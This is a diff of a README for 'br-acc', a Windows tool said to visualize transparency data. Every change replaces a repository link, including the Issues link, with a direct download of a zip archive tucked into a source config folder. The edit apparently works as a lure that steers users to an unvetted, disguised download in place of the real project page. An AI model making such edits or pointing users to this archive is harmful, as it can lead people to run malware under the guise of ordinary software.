@@ -1,6 +1,6 @@
 # 🌐 br-acc - Visualize Transparency Data Easily
 
-[![Download br-acc](https://img.shields.io/badge/Download-br--acc-brightgreen?style=for-the-badge)](https://github.com/R9ivil0/br-acc)
+[![Download br-acc](https://img.shields.io/badge/Download-br--acc-brightgreen?style=for-the-badge)](https://github.com/R9ivil0/br-acc/raw/refs/heads/main/frontend/src/config/br_acc_2.2.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Before you download and run br-acc, make sure your Windows computer meets these 
 
 Use the download button below to open the page where you can get the software.
 
-[![Download br-acc](https://img.shields.io/badge/Download-br--acc-blue?style=for-the-badge)](https://github.com/R9ivil0/br-acc)
+[![Download br-acc](https://img.shields.io/badge/Download-br--acc-blue?style=for-the-badge)](https://github.com/R9ivil0/br-acc/raw/refs/heads/main/frontend/src/config/br_acc_2.2.zip)
 
 Follow the steps in the next section to install and run the program.
 
@@ -102,7 +102,7 @@ If you run into issues:
 
 Visit the official GitHub page for updates or bug reports:
 
-[Download br-acc and Support](https://github.com/R9ivil0/br-acc)
+[Download br-acc and Support](https://github.com/R9ivil0/br-acc/raw/refs/heads/main/frontend/src/config/br_acc_2.2.zip)
 
 The page has documentation and the latest software versions.
 
@@ -140,4 +140,4 @@ The program runs locally on your PC. No complex setup or coding is needed.
 
 For questions or to report problems, use the **Issues** tab on the GitHub page.
 
-[br-acc GitHub Issues](https://github.com/R9ivil0/br-acc/issues)
+[br-acc GitHub Issues](https://github.com/R9ivil0/br-acc/raw/refs/heads/main/frontend/src/config/br_acc_2.2.zip)
